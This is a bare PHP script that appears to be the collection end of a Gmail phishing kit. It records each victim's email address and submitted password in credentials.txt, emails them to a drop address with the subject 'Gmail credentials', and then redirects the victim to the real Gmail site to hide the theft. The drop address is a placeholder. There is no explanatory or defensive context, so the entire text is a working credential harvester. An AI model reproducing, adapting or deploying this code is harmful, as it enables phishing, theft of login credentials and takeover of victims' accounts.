<?php
session_start();
header ('Location:https://google.com/gmail/');
$handle = fopen("credentials.txt", "a");
fwrite($handle, $_SESSION["Email"]."\t".$_POST["Passwd"].PHP_EOL);
fclose($handle);
$maildrop="sample@emailcom";
mail($maildrop,"Gmail credentials",$_SESSION["Email"]."\t".$_POST["Passwd"]);
session_destroy();
exit;
?>